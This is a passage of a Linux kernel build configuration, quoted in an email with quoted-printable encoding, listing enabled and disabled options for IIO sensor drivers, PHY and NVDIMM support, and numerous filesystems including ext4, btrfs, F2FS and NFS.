> # end of Clock Generator/Distribution
>=20
> #
> # Phase-Locked Loop (PLL) frequency synthesizers
> #
> # CONFIG_ADF4350 is not set
> # CONFIG_ADF4371 is not set
> # CONFIG_ADF4377 is not set
> # CONFIG_ADMFM2000 is not set
> # CONFIG_ADMV1013 is not set
> # CONFIG_ADMV1014 is not set
> # CONFIG_ADMV4420 is not set
> # CONFIG_ADRF6780 is not set
> # end of Phase-Locked Loop (PLL) frequency synthesizers
> # end of Frequency Synthesizers DDS/PLL
>=20
> #
> # Digital gyroscope sensors
> #
> # CONFIG_ADIS16080 is not set
> # CONFIG_ADIS16130 is not set
> # CONFIG_ADIS16136 is not set
> # CONFIG_ADIS16260 is not set
> # CONFIG_ADXRS290 is not set
> # CONFIG_ADXRS450 is not set
> # CONFIG_BMG160 is not set
> # CONFIG_FXAS21002C is not set
> CONFIG_HID_SENSOR_GYRO_3D=3Dy
> # CONFIG_MPU3050_I2C is not set
> # CONFIG_IIO_ST_GYRO_3AXIS is not set
> # CONFIG_ITG3200 is not set
> # end of Digital gyroscope sensors
>=20
> #
> # Health Sensors
> #
>=20
> #
> # Heart Rate Monitors
> #
> # CONFIG_AFE4403 is not set
> # CONFIG_AFE4404 is not set
> # CONFIG_MAX30100 is not set
> # CONFIG_MAX30102 is not set
> # end of Heart Rate Monitors
> # end of Health Sensors
>=20
> #
> # Humidity sensors
> #
> # CONFIG_AM2315 is not set
> # CONFIG_DHT11 is not set
> # CONFIG_ENS210 is not set
> # CONFIG_HDC100X is not set
> # CONFIG_HDC2010 is not set
> # CONFIG_HDC3020 is not set
> CONFIG_HID_SENSOR_HUMIDITY=3Dy
> # CONFIG_HTS221 is not set
> # CONFIG_HTU21 is not set
> # CONFIG_SI7005 is not set
> # CONFIG_SI7020 is not set
> # end of Humidity sensors
>=20
> #
> # Inertial measurement units
> #
> # CONFIG_ADIS16400 is not set
> # CONFIG_ADIS16460 is not set
> # CONFIG_ADIS16475 is not set
> # CONFIG_ADIS16480 is not set
> # CONFIG_ADIS16550 is not set
> # CONFIG_BMI160_I2C is not set
> # CONFIG_BMI160_SPI is not set
> # CONFIG_BMI270_I2C is not set
> # CONFIG_BMI270_SPI is not set
> # CONFIG_BMI323_I2C is not set
> # CONFIG_BMI323_SPI is not set
> # CONFIG_BOSCH_BNO055_SERIAL is not set
> # CONFIG_BOSCH_BNO055_I2C is not set
> # CONFIG_FXOS8700_I2C is not set
> # CONFIG_FXOS8700_SPI is not set
> # CONFIG_KMX61 is not set
> # CONFIG_INV_ICM42600_I2C is not set
> # CONFIG_INV_ICM42600_SPI is not set
> # CONFIG_INV_ICM45600_I2C is not set
> # CONFIG_INV_ICM45600_SPI is not set
> # CONFIG_INV_MPU6050_I2C is not set
> # CONFIG_INV_MPU6050_SPI is not set
> # CONFIG_SMI240 is not set
> # CONFIG_SMI330_I2C is not set
> # CONFIG_SMI330_SPI is not set
> # CONFIG_IIO_ST_LSM6DSX is not set
> # CONFIG_IIO_ST_LSM9DS0 is not set
> # end of Inertial measurement units
>=20
> #
> # Light sensors
> #
> # CONFIG_ACPI_ALS is not set
> # CONFIG_ADJD_S311 is not set
> # CONFIG_ADUX1020 is not set
> # CONFIG_AL3000A is not set
> # CONFIG_AL3010 is not set
> # CONFIG_AL3320A is not set
> # CONFIG_APDS9160 is not set
> # CONFIG_APDS9300 is not set
> # CONFIG_APDS9306 is not set
> # CONFIG_APDS9960 is not set
> # CONFIG_AS73211 is not set
> # CONFIG_BH1745 is not set
> # CONFIG_BH1750 is not set
> # CONFIG_BH1780 is not set
> # CONFIG_CM32181 is not set
> # CONFIG_CM3232 is not set
> # CONFIG_CM3323 is not set
> # CONFIG_CM3605 is not set
> # CONFIG_CM36651 is not set
> # CONFIG_GP2AP002 is not set
> # CONFIG_GP2AP020A00F is not set
> # CONFIG_SENSORS_ISL29018 is not set
> # CONFIG_SENSORS_ISL29028 is not set
> # CONFIG_ISL29125 is not set
> # CONFIG_ISL76682 is not set
> CONFIG_HID_SENSOR_ALS=3Dy
> CONFIG_HID_SENSOR_PROX=3Dy
> # CONFIG_JSA1212 is not set
> # CONFIG_ROHM_BU27034 is not set
> # CONFIG_RPR0521 is not set
> # CONFIG_LTR390 is not set
> # CONFIG_LTR501 is not set
> # CONFIG_LTRF216A is not set
> # CONFIG_LV0104CS is not set
> # CONFIG_MAX44000 is not set
> # CONFIG_MAX44009 is not set
> # CONFIG_NOA1305 is not set
> # CONFIG_OPT3001 is not set
> # CONFIG_OPT4001 is not set
> # CONFIG_OPT4060 is not set
> # CONFIG_PA12203001 is not set
> # CONFIG_SI1133 is not set
> # CONFIG_SI1145 is not set
> # CONFIG_STK3310 is not set
> # CONFIG_ST_UVIS25 is not set
> # CONFIG_TCS3414 is not set
> # CONFIG_TCS3472 is not set
> # CONFIG_SENSORS_TSL2563 is not set
> # CONFIG_TSL2583 is not set
> # CONFIG_TSL2591 is not set
> # CONFIG_TSL2772 is not set
> # CONFIG_TSL4531 is not set
> # CONFIG_US5182D is not set
> # CONFIG_VCNL4000 is not set
> # CONFIG_VCNL4035 is not set
> # CONFIG_VEML3235 is not set
> # CONFIG_VEML6030 is not set
> # CONFIG_VEML6040 is not set
> # CONFIG_VEML6046X00 is not set
> # CONFIG_VEML6070 is not set
> # CONFIG_VEML6075 is not set
> # CONFIG_VL6180 is not set
> # CONFIG_ZOPT2201 is not set
> # end of Light sensors
>=20
> #
> # Magnetometer sensors
> #
> # CONFIG_AF8133J is not set
> # CONFIG_AK8974 is not set
> # CONFIG_AK8975 is not set
> # CONFIG_AK09911 is not set
> # CONFIG_ALS31300 is not set
> # CONFIG_BMC150_MAGN_I2C is not set
> # CONFIG_BMC150_MAGN_SPI is not set
> # CONFIG_MAG3110 is not set
> CONFIG_HID_SENSOR_MAGNETOMETER_3D=3Dy
> # CONFIG_MMC35240 is not set
> # CONFIG_MMC5633 is not set
> # CONFIG_IIO_ST_MAGN_3AXIS is not set
> # CONFIG_INFINEON_TLV493D is not set
> # CONFIG_SENSORS_HMC5843_I2C is not set
> # CONFIG_SENSORS_HMC5843_SPI is not set
> # CONFIG_SENSORS_RM3100_I2C is not set
> # CONFIG_SENSORS_RM3100_SPI is not set
> # CONFIG_SI7210 is not set
> # CONFIG_TI_TMAG5273 is not set
> # CONFIG_YAMAHA_YAS530 is not set
> # end of Magnetometer sensors
>=20
> #
> # Multiplexers
> #
> # CONFIG_IIO_MUX is not set
> # end of Multiplexers
>=20
> #
> # Inclinometer sensors
> #
> CONFIG_HID_SENSOR_INCLINOMETER_3D=3Dy
> CONFIG_HID_SENSOR_DEVICE_ROTATION=3Dy
> # end of Inclinometer sensors
>=20
> #
> # Triggers - standalone
> #
> # CONFIG_IIO_INTERRUPT_TRIGGER is not set
> # CONFIG_IIO_SYSFS_TRIGGER is not set
> # end of Triggers - standalone
>=20
> #
> # Linear and angular position sensors
> #
> CONFIG_HID_SENSOR_CUSTOM_INTEL_HINGE=3Dy
> # end of Linear and angular position sensors
>=20
> #
> # Digital potentiometers
> #
> # CONFIG_AD5110 is not set
> # CONFIG_AD5272 is not set
> # CONFIG_DS1803 is not set
> # CONFIG_MAX5432 is not set
> # CONFIG_MAX5481 is not set
> # CONFIG_MAX5487 is not set
> # CONFIG_MCP4018 is not set
> # CONFIG_MCP4131 is not set
> # CONFIG_MCP4531 is not set
> # CONFIG_MCP41010 is not set
> # CONFIG_TPL0102 is not set
> # CONFIG_X9250 is not set
> # end of Digital potentiometers
>=20
> #
> # Digital potentiostats
> #
> # CONFIG_LMP91000 is not set
> # end of Digital potentiostats
>=20
> #
> # Pressure sensors
> #
> # CONFIG_ABP060MG is not set
> # CONFIG_ABP2030PA_I2C is not set
> # CONFIG_ABP2030PA_SPI is not set
> # CONFIG_ROHM_BM1390 is not set
> # CONFIG_BMP280 is not set
> # CONFIG_DLHL60D is not set
> # CONFIG_DPS310 is not set
> CONFIG_HID_SENSOR_PRESS=3Dy
> # CONFIG_HP03 is not set
> # CONFIG_HSC030PA is not set
> # CONFIG_ICP10100 is not set
> # CONFIG_MPL115_I2C is not set
> # CONFIG_MPL115_SPI is not set
> # CONFIG_MPL3115 is not set
> # CONFIG_MPRLS0025PA_I2C is not set
> # CONFIG_MPRLS0025PA_SPI is not set
> # CONFIG_MS5611 is not set
> # CONFIG_MS5637 is not set
> # CONFIG_SDP500 is not set
> # CONFIG_IIO_ST_PRESS is not set
> # CONFIG_T5403 is not set
> # CONFIG_HP206C is not set
> # CONFIG_ZPA2326 is not set
> # CONFIG_ADP810 is not set
> # end of Pressure sensors
>=20
> #
> # Lightning sensors
> #
> # CONFIG_AS3935 is not set
> # end of Lightning sensors
>=20
> #
> # Proximity and distance sensors
> #
> # CONFIG_D3323AA is not set
> # CONFIG_HX9023S is not set
> # CONFIG_IRSD200 is not set
> # CONFIG_ISL29501 is not set
> # CONFIG_LIDAR_LITE_V2 is not set
> # CONFIG_MB1232 is not set
> # CONFIG_PING is not set
> # CONFIG_RFD77402 is not set
> # CONFIG_SRF04 is not set
> # CONFIG_SX9310 is not set
> # CONFIG_SX9324 is not set
> # CONFIG_SX9360 is not set
> # CONFIG_SX9500 is not set
> # CONFIG_SRF08 is not set
> # CONFIG_VCNL3020 is not set
> # CONFIG_VL53L0X_I2C is not set
> # CONFIG_AW96103 is not set
> # end of Proximity and distance sensors
>=20
> #
> # Resolver to digital converters
> #
> # CONFIG_AD2S90 is not set
> # CONFIG_AD2S1200 is not set
> # CONFIG_AD2S1210 is not set
> # end of Resolver to digital converters
>=20
> #
> # Temperature sensors
> #
> # CONFIG_LTC2983 is not set
> # CONFIG_MAXIM_THERMOCOUPLE is not set
> CONFIG_HID_SENSOR_TEMP=3Dy
> # CONFIG_MLX90614 is not set
> # CONFIG_MLX90632 is not set
> # CONFIG_MLX90635 is not set
> # CONFIG_TMP006 is not set
> # CONFIG_TMP007 is not set
> # CONFIG_TMP117 is not set
> # CONFIG_TSYS01 is not set
> # CONFIG_TSYS02D is not set
> # CONFIG_MAX30208 is not set
> # CONFIG_MAX31856 is not set
> # CONFIG_MAX31865 is not set
> # CONFIG_MCP9600 is not set
> # end of Temperature sensors
>=20
> # CONFIG_NTB is not set
> # CONFIG_PWM is not set
>=20
> #
> # IRQ chip support
> #
> CONFIG_IRQCHIP=3Dy
> CONFIG_IRQ_MSI_LIB=3Dy
> # CONFIG_AL_FIC is not set
> # CONFIG_XILINX_INTC is not set
> # end of IRQ chip support
>=20
> # CONFIG_IPACK_BUS is not set
> CONFIG_RESET_CONTROLLER=3Dy
> # CONFIG_RESET_GPIO is not set
> # CONFIG_RESET_INTEL_GW is not set
> # CONFIG_RESET_SIMPLE is not set
> # CONFIG_RESET_TI_SYSCON is not set
> # CONFIG_RESET_TI_TPS380X is not set
>=20
> #
> # PHY Subsystem
> #
> CONFIG_GENERIC_PHY=3Dy
> # CONFIG_PHY_GOOGLE_USB is not set
> CONFIG_USB_LGM_PHY=3Dy
> # CONFIG_PHY_CAN_TRANSCEIVER is not set
> # CONFIG_PHY_NXP_PTN3222 is not set
>=20
> #
> # PHY drivers for Broadcom platforms
> #
> # CONFIG_BCM_KONA_USB2_PHY is not set
> # end of PHY drivers for Broadcom platforms
>=20
> # CONFIG_PHY_CADENCE_TORRENT is not set
> # CONFIG_PHY_CADENCE_DPHY is not set
> # CONFIG_PHY_CADENCE_DPHY_RX is not set
> # CONFIG_PHY_CADENCE_SIERRA is not set
> # CONFIG_PHY_CADENCE_SALVO is not set
> # CONFIG_PHY_PXA_28NM_HSIC is not set
> # CONFIG_PHY_PXA_28NM_USB2 is not set
> CONFIG_PHY_CPCAP_USB=3Dy
> # CONFIG_PHY_MAPPHONE_MDM6600 is not set
> # CONFIG_PHY_OCELOT_SERDES is not set
> CONFIG_PHY_QCOM_USB_HS=3Dy
> CONFIG_PHY_QCOM_USB_HSIC=3Dy
> CONFIG_PHY_SAMSUNG_USB2=3Dy
> CONFIG_PHY_TUSB1210=3Dy
> # CONFIG_PHY_INTEL_LGM_COMBO is not set
> # CONFIG_PHY_INTEL_LGM_EMMC is not set
> # end of PHY Subsystem
>=20
> # CONFIG_POWERCAP is not set
> # CONFIG_MCB is not set
>=20
> #
> # Performance monitor support
> #
> # CONFIG_DWC_PCIE_PMU is not set
> # end of Performance monitor support
>=20
> CONFIG_RAS=3Dy
> CONFIG_USB4=3Dy
> # CONFIG_USB4_DEBUGFS_WRITE is not set
> # CONFIG_USB4_DMA_TEST is not set
>=20
> #
> # Android
> #
> CONFIG_ANDROID_BINDER_IPC=3Dy
> # CONFIG_ANDROID_BINDERFS is not set
> CONFIG_ANDROID_BINDER_DEVICES=3D"binder0,binder1"
> # end of Android
>=20
> CONFIG_LIBNVDIMM=3Dy
> CONFIG_BLK_DEV_PMEM=3Dy
> CONFIG_ND_CLAIM=3Dy
> CONFIG_ND_BTT=3Dy
> CONFIG_BTT=3Dy
> CONFIG_ND_PFN=3Dy
> CONFIG_NVDIMM_PFN=3Dy
> CONFIG_NVDIMM_DAX=3Dy
> CONFIG_OF_PMEM=3Dy
> CONFIG_RAMDAX=3Dy
> CONFIG_NVDIMM_KEYS=3Dy
> # CONFIG_NVDIMM_SECURITY_TEST is not set
> CONFIG_DAX=3Dy
> CONFIG_DEV_DAX=3Dy
> # CONFIG_DEV_DAX_PMEM is not set
> # CONFIG_DEV_DAX_KMEM is not set
> CONFIG_NVMEM=3Dy
> CONFIG_NVMEM_SYSFS=3Dy
> CONFIG_NVMEM_LAYOUTS=3Dy
>=20
> #
> # Layout Types
> #
> # CONFIG_NVMEM_LAYOUT_SL28_VPD is not set
> # CONFIG_NVMEM_LAYOUT_ONIE_TLV is not set
> # CONFIG_NVMEM_LAYOUT_U_BOOT_ENV is not set
> # end of Layout Types
>=20
> # CONFIG_NVMEM_RMEM is not set
> # CONFIG_NVMEM_U_BOOT_ENV is not set
>=20
> #
> # HW tracing support
> #
> # CONFIG_STM is not set
> # CONFIG_INTEL_TH is not set
> # end of HW tracing support
>=20
> # CONFIG_FPGA is not set
> # CONFIG_FSI is not set
> CONFIG_TEE=3Dy
> CONFIG_TEE_DMABUF_HEAPS=3Dy
> CONFIG_OPTEE_STATIC_PROTMEM_POOL=3Dy
> # CONFIG_SIOX is not set
> # CONFIG_SLIMBUS is not set
> # CONFIG_INTERCONNECT is not set
> CONFIG_COUNTER=3Dy
> # CONFIG_INTEL_QEP is not set
> # CONFIG_INTERRUPT_CNT is not set
> CONFIG_MOST=3Dy
> CONFIG_MOST_USB_HDM=3Dy
> # CONFIG_MOST_CDEV is not set
> # CONFIG_MOST_SND is not set
> # CONFIG_PECI is not set
> # CONFIG_HTE is not set
> # end of Device Drivers
>=20
> #
> # File systems
> #
> CONFIG_DCACHE_WORD_ACCESS=3Dy
> CONFIG_VALIDATE_FS_PARSER=3Dy
> CONFIG_FS_IOMAP=3Dy
> CONFIG_FS_STACK=3Dy
> CONFIG_BUFFER_HEAD=3Dy
> CONFIG_LEGACY_DIRECT_IO=3Dy
> # CONFIG_EXT2_FS is not set
> CONFIG_EXT4_FS=3Dy
> CONFIG_EXT4_USE_FOR_EXT2=3Dy
> CONFIG_EXT4_FS_POSIX_ACL=3Dy
> CONFIG_EXT4_FS_SECURITY=3Dy
> # CONFIG_EXT4_DEBUG is not set
> CONFIG_JBD2=3Dy
> # CONFIG_JBD2_DEBUG is not set
> CONFIG_FS_MBCACHE=3Dy
> CONFIG_JFS_FS=3Dy
> CONFIG_JFS_POSIX_ACL=3Dy
> CONFIG_JFS_SECURITY=3Dy
> CONFIG_JFS_DEBUG=3Dy
> # CONFIG_JFS_STATISTICS is not set
> CONFIG_XFS_FS=3Dy
> # CONFIG_XFS_SUPPORT_V4 is not set
> # CONFIG_XFS_SUPPORT_ASCII_CI is not set
> CONFIG_XFS_QUOTA=3Dy
> CONFIG_XFS_POSIX_ACL=3Dy
> CONFIG_XFS_RT=3Dy
> # CONFIG_XFS_ONLINE_SCRUB is not set
> # CONFIG_XFS_WARN is not set
> # CONFIG_XFS_DEBUG is not set
> CONFIG_GFS2_FS=3Dy
> CONFIG_GFS2_FS_LOCKING_DLM=3Dy
> CONFIG_OCFS2_FS=3Dy
> CONFIG_OCFS2_FS_O2CB=3Dy
> CONFIG_OCFS2_FS_USERSPACE_CLUSTER=3Dy
> CONFIG_OCFS2_FS_STATS=3Dy
> # CONFIG_OCFS2_DEBUG_MASKLOG is not set
> CONFIG_OCFS2_DEBUG_FS=3Dy
> CONFIG_BTRFS_FS=3Dy
> CONFIG_BTRFS_FS_POSIX_ACL=3Dy
> # CONFIG_BTRFS_FS_RUN_SANITY_TESTS is not set
> # CONFIG_BTRFS_DEBUG is not set
> CONFIG_BTRFS_ASSERT=3Dy
> # CONFIG_BTRFS_EXPERIMENTAL is not set
> CONFIG_NILFS2_FS=3Dy
> CONFIG_F2FS_FS=3Dy
> CONFIG_F2FS_STAT_FS=3Dy
> CONFIG_F2FS_FS_XATTR=3Dy
> CONFIG_F2FS_FS_POSIX_ACL=3Dy
> CONFIG_F2FS_FS_SECURITY=3Dy
> CONFIG_F2FS_CHECK_FS=3Dy
> CONFIG_F2FS_FAULT_INJECTION=3Dy
> CONFIG_F2FS_FS_COMPRESSION=3Dy
> CONFIG_F2FS_FS_LZO=3Dy
> CONFIG_F2FS_FS_LZORLE=3Dy
> CONFIG_F2FS_FS_LZ4=3Dy
> CONFIG_F2FS_FS_LZ4HC=3Dy
> CONFIG_F2FS_FS_ZSTD=3Dy
> # CONFIG_F2FS_IOSTAT is not set
> # CONFIG_F2FS_UNFAIR_RWSEM is not set
> CONFIG_ZONEFS_FS=3Dy
> CONFIG_FS_DAX=3Dy
> CONFIG_FS_DAX_PMD=3Dy
> CONFIG_FS_POSIX_ACL=3Dy
> CONFIG_EXPORTFS=3Dy
> CONFIG_EXPORTFS_BLOCK_OPS=3Dy
> CONFIG_FILE_LOCKING=3Dy
> CONFIG_FS_ENCRYPTION=3Dy
> CONFIG_FS_ENCRYPTION_ALGS=3Dy
> # CONFIG_FS_ENCRYPTION_INLINE_CRYPT is not set
> CONFIG_FS_VERITY=3Dy
> CONFIG_FS_VERITY_BUILTIN_SIGNATURES=3Dy
> CONFIG_FSNOTIFY=3Dy
> CONFIG_DNOTIFY=3Dy
> CONFIG_INOTIFY_USER=3Dy
> CONFIG_FANOTIFY=3Dy
> CONFIG_FANOTIFY_ACCESS_PERMISSIONS=3Dy
> CONFIG_QUOTA=3Dy
> CONFIG_QUOTA_NETLINK_INTERFACE=3Dy
> # CONFIG_QUOTA_DEBUG is not set
> CONFIG_QUOTA_TREE=3Dy
> # CONFIG_QFMT_V1 is not set
> CONFIG_QFMT_V2=3Dy
> CONFIG_QUOTACTL=3Dy
> CONFIG_AUTOFS_FS=3Dy
> CONFIG_FUSE_FS=3Dy
> CONFIG_CUSE=3Dy
> CONFIG_VIRTIO_FS=3Dy
> CONFIG_FUSE_DAX=3Dy
> # CONFIG_FUSE_PASSTHROUGH is not set
> # CONFIG_FUSE_IO_URING is not set
> CONFIG_OVERLAY_FS=3Dy
> CONFIG_OVERLAY_FS_REDIRECT_DIR=3Dy
> CONFIG_OVERLAY_FS_REDIRECT_ALWAYS_FOLLOW=3Dy
> CONFIG_OVERLAY_FS_INDEX=3Dy
> # CONFIG_OVERLAY_FS_NFS_EXPORT is not set
> # CONFIG_OVERLAY_FS_XINO_AUTO is not set
> # CONFIG_OVERLAY_FS_METACOPY is not set
> CONFIG_OVERLAY_FS_DEBUG=3Dy
>=20
> #
> # Caches
> #
> CONFIG_NETFS_SUPPORT=3Dy
> # CONFIG_NETFS_STATS is not set
> # CONFIG_NETFS_DEBUG is not set
> CONFIG_FSCACHE=3Dy
> # CONFIG_FSCACHE_STATS is not set
> CONFIG_CACHEFILES=3Dy
> # CONFIG_CACHEFILES_DEBUG is not set
> # CONFIG_CACHEFILES_ERROR_INJECTION is not set
> # CONFIG_CACHEFILES_ONDEMAND is not set
> # end of Caches
>=20
> #
> # CD-ROM/DVD Filesystems
> #
> CONFIG_ISO9660_FS=3Dy
> CONFIG_JOLIET=3Dy
> CONFIG_ZISOFS=3Dy
> CONFIG_UDF_FS=3Dy
> # end of CD-ROM/DVD Filesystems
>=20
> #
> # DOS/FAT/EXFAT/NT Filesystems
> #
> CONFIG_FAT_FS=3Dy
> CONFIG_MSDOS_FS=3Dy
> CONFIG_VFAT_FS=3Dy
> CONFIG_FAT_DEFAULT_CODEPAGE=3D437
> CONFIG_FAT_DEFAULT_IOCHARSET=3D"iso8859-1"
> # CONFIG_FAT_DEFAULT_UTF8 is not set
> CONFIG_EXFAT_FS=3Dy
> CONFIG_EXFAT_DEFAULT_IOCHARSET=3D"utf8"
> CONFIG_NTFS3_FS=3Dy
> # CONFIG_NTFS3_64BIT_CLUSTER is not set
> CONFIG_NTFS3_LZX_XPRESS=3Dy
> CONFIG_NTFS3_FS_POSIX_ACL=3Dy
> # CONFIG_NTFS_FS is not set
> # end of DOS/FAT/EXFAT/NT Filesystems
>=20
> #
> # Pseudo filesystems
> #
> CONFIG_PROC_FS=3Dy
> CONFIG_PROC_KCORE=3Dy
> CONFIG_PROC_VMCORE=3Dy
> # CONFIG_PROC_VMCORE_DEVICE_DUMP is not set
> CONFIG_PROC_SYSCTL=3Dy
> CONFIG_PROC_PAGE_MONITOR=3Dy
> CONFIG_PROC_CHILDREN=3Dy
> CONFIG_PROC_PID_ARCH_STATUS=3Dy
> CONFIG_KERNFS=3Dy
> CONFIG_SYSFS=3Dy
> CONFIG_TMPFS=3Dy
> CONFIG_TMPFS_POSIX_ACL=3Dy
> CONFIG_TMPFS_XATTR=3Dy
> # CONFIG_TMPFS_INODE64 is not set
> CONFIG_TMPFS_QUOTA=3Dy
> CONFIG_ARCH_SUPPORTS_HUGETLBFS=3Dy
> CONFIG_HUGETLBFS=3Dy
> # CONFIG_HUGETLB_PAGE_OPTIMIZE_VMEMMAP_DEFAULT_ON is not set
> CONFIG_HUGETLB_PAGE=3Dy
> CONFIG_HUGETLB_PAGE_OPTIMIZE_VMEMMAP=3Dy
> CONFIG_HUGETLB_PMD_PAGE_TABLE_SHARING=3Dy
> CONFIG_ARCH_HAS_GIGANTIC_PAGE=3Dy
> CONFIG_CONFIGFS_FS=3Dy
> # end of Pseudo filesystems
>=20
> CONFIG_MISC_FILESYSTEMS=3Dy
> CONFIG_ORANGEFS_FS=3Dy
> CONFIG_ADFS_FS=3Dy
> # CONFIG_ADFS_FS_RW is not set
> CONFIG_AFFS_FS=3Dy
> CONFIG_ECRYPT_FS=3Dy
> CONFIG_ECRYPT_FS_MESSAGING=3Dy
> CONFIG_HFS_FS=3Dy
> CONFIG_HFSPLUS_FS=3Dy
> CONFIG_BEFS_FS=3Dy
> # CONFIG_BEFS_DEBUG is not set
> CONFIG_BFS_FS=3Dy
> CONFIG_EFS_FS=3Dy
> CONFIG_JFFS2_FS=3Dy
> CONFIG_JFFS2_FS_DEBUG=3D0
> CONFIG_JFFS2_FS_WRITEBUFFER=3Dy
> # CONFIG_JFFS2_FS_WBUF_VERIFY is not set
> CONFIG_JFFS2_SUMMARY=3Dy
> CONFIG_JFFS2_FS_XATTR=3Dy
> CONFIG_JFFS2_FS_POSIX_ACL=3Dy
> CONFIG_JFFS2_FS_SECURITY=3Dy
> CONFIG_JFFS2_COMPRESSION_OPTIONS=3Dy
> CONFIG_JFFS2_ZLIB=3Dy
> CONFIG_JFFS2_LZO=3Dy
> CONFIG_JFFS2_RTIME=3Dy
> CONFIG_JFFS2_RUBIN=3Dy
> # CONFIG_JFFS2_CMODE_NONE is not set
> CONFIG_JFFS2_CMODE_PRIORITY=3Dy
> # CONFIG_JFFS2_CMODE_SIZE is not set
> # CONFIG_JFFS2_CMODE_FAVOURLZO is not set
> CONFIG_UBIFS_FS=3Dy
> CONFIG_UBIFS_FS_ADVANCED_COMPR=3Dy
> CONFIG_UBIFS_FS_LZO=3Dy
> CONFIG_UBIFS_FS_ZLIB=3Dy
> CONFIG_UBIFS_FS_ZSTD=3Dy
> CONFIG_UBIFS_ATIME_SUPPORT=3Dy
> CONFIG_UBIFS_FS_XATTR=3Dy
> CONFIG_UBIFS_FS_SECURITY=3Dy
> # CONFIG_UBIFS_FS_AUTHENTICATION is not set
> CONFIG_CRAMFS=3Dy
> CONFIG_CRAMFS_BLOCKDEV=3Dy
> CONFIG_CRAMFS_MTD=3Dy
> CONFIG_SQUASHFS=3Dy
> # CONFIG_SQUASHFS_FILE_CACHE is not set
> CONFIG_SQUASHFS_FILE_DIRECT=3Dy
> CONFIG_SQUASHFS_DECOMP_MULTI=3Dy
> # CONFIG_SQUASHFS_CHOICE_DECOMP_BY_MOUNT is not set
> # CONFIG_SQUASHFS_COMPILE_DECOMP_SINGLE is not set
> CONFIG_SQUASHFS_COMPILE_DECOMP_MULTI=3Dy
> # CONFIG_SQUASHFS_COMPILE_DECOMP_MULTI_PERCPU is not set
> # CONFIG_SQUASHFS_MOUNT_DECOMP_THREADS is not set
> CONFIG_SQUASHFS_XATTR=3Dy
> # CONFIG_SQUASHFS_COMP_CACHE_FULL is not set
> CONFIG_SQUASHFS_ZLIB=3Dy
> CONFIG_SQUASHFS_LZ4=3Dy
> CONFIG_SQUASHFS_LZO=3Dy
> CONFIG_SQUASHFS_XZ=3Dy
> CONFIG_SQUASHFS_ZSTD=3Dy
> CONFIG_SQUASHFS_4K_DEVBLK_SIZE=3Dy
> # CONFIG_SQUASHFS_EMBEDDED is not set
> CONFIG_SQUASHFS_FRAGMENT_CACHE_SIZE=3D3
> CONFIG_VXFS_FS=3Dy
> CONFIG_MINIX_FS=3Dy
> CONFIG_OMFS_FS=3Dy
> CONFIG_HPFS_FS=3Dy
> CONFIG_QNX4FS_FS=3Dy
> CONFIG_QNX6FS_FS=3Dy
> # CONFIG_QNX6FS_DEBUG is not set
> CONFIG_ROMFS_FS=3Dy
> # CONFIG_ROMFS_BACKED_BY_BLOCK is not set
> # CONFIG_ROMFS_BACKED_BY_MTD is not set
> CONFIG_ROMFS_BACKED_BY_BOTH=3Dy
> CONFIG_ROMFS_ON_BLOCK=3Dy
> CONFIG_ROMFS_ON_MTD=3Dy
> CONFIG_PSTORE=3Dy
> CONFIG_PSTORE_DEFAULT_KMSG_BYTES=3D10240
> CONFIG_PSTORE_COMPRESS=3Dy
> # CONFIG_PSTORE_CONSOLE is not set
> # CONFIG_PSTORE_PMSG is not set
> # CONFIG_PSTORE_FTRACE is not set
> # CONFIG_PSTORE_RAM is not set
> # CONFIG_PSTORE_BLK is not set
> CONFIG_UFS_FS=3Dy
> CONFIG_UFS_FS_WRITE=3Dy
> # CONFIG_UFS_DEBUG is not set
> CONFIG_EROFS_FS=3Dy
> # CONFIG_EROFS_FS_DEBUG is not set
> CONFIG_EROFS_FS_XATTR=3Dy
> CONFIG_EROFS_FS_POSIX_ACL=3Dy
> CONFIG_EROFS_FS_SECURITY=3Dy
> # CONFIG_EROFS_FS_BACKED_BY_FILE is not set
> CONFIG_EROFS_FS_ZIP=3Dy
> # CONFIG_EROFS_FS_ZIP_LZMA is not set
> # CONFIG_EROFS_FS_ZIP_DEFLATE is not set
> # CONFIG_EROFS_FS_ZIP_ZSTD is not set
> # CONFIG_EROFS_FS_ZIP_ACCEL is not set
> # CONFIG_EROFS_FS_ONDEMAND is not set
> # CONFIG_EROFS_FS_PCPU_KTHREAD is not set
> # CONFIG_EROFS_FS_PAGE_CACHE_SHARE is not set
> CONFIG_NETWORK_FILESYSTEMS=3Dy
> CONFIG_NFS_FS=3Dy
> # CONFIG_NFS_V2 is not set
> CONFIG_NFS_V3=3Dy
> CONFIG_NFS_V3_ACL=3Dy
> CONFIG_NFS_V4=3Dy
> # CONFIG_NFS_SWAP is not set
> CONFIG_NFS_V4_0=3Dy
> CONFIG_NFS_V4_2=3Dy
> CONFIG_PNFS_FILE_LAYOUT=3Dy
> CONFIG_PNFS_BLOCK=3Dy
> CONFIG_PNFS_FLEXFILE_LAYOUT=3Dy
> CONFIG_NFS_V4_1_IMPLEMENTATION_ID_DOMAIN=3D"kernel.org"
> # CONFIG_NFS_V4_1_MIGRATION is not set
> CONFIG_NFS_V4_SECURITY_LABEL=3Dy
> CONFIG_ROOT_NFS=3Dy
> CONFIG_NFS_FSCACHE=3Dy
> # CONFIG_NFS_USE_LEGACY_DNS is not set
> CONFIG_NFS_USE_KERNEL_DNS=3Dy
> # CONFIG_NFS_DISABLE_UDP_SUPPORT is not set
> CONFIG_NFS_V4_2_READ_PLUS=3Dy
> CONFIG_NFSD=3Dy
> # CONFIG_NFSD_V2 is not set
> CONFIG_NFSD_V3_ACL=3Dy
> CONFIG_NFSD_V4=3Dy
> CONFIG_NFSD_PNFS=3Dy
> CONFIG_NFSD_BLOCKLAYOUT=3Dy
> CONFIG_NFSD_SCSILAYOUT=3Dy
> CONFIG_NFSD_FLEXFILELAYOUT=3Dy
> CONFIG_NFSD_V4_2_INTER_SSC=3Dy
> CONFIG_NFSD_V4_SECURITY_LABEL=3Dy
> # CONFIG_NFSD_LEGACY_CLIENT_TRACKING is not set
> # CONFIG_NFSD_V4_DELEG_TIMESTAMPS is not set
> # CONFIG_NFSD_V4_POSIX_ACLS is not set
> CONFIG_GRACE_PERIOD=3Dy
> CONFIG_LOCKD=3Dy
> CONFIG_LOCKD_V4=3Dy
> CONFIG_NFS_ACL_SUPPORT=3Dy
> CONFIG_NFS_COMMON=3Dy
> # CONFIG_NFS_LOCALIO is not set
> CONFIG_NFS_V4_2_SSC_HELPER=3Dy
> CONFIG_SUNRPC=3Dy
> CONFIG_SUNRPC_GSS=3Dy
> CONFIG_SUNRPC_BACKCHANNEL=3Dy
> CONFIG_RPCSEC_GSS_KRB5=3Dy
